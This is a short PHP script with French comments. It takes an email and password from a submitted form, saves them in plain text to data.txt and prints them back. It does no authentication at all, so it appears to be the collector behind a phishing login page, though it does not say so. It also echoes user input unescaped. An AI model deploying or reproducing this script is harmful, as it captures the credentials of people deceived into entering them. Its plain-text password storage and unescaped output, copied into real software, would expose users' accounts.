<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST["email"]) ? $_POST["email"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";

    // Ecrire les informations dans un fichier
    $file = 'data.txt';
    file_put_contents($file, "Email: " . $email . PHP_EOL . "Mot de passe: " . $password . PHP_EOL);

    // Affichage dans le terminal (console)
    echo "Email : " . $email . "\n";
    echo "Mot de passe : " . $password . "\n";
}
?>
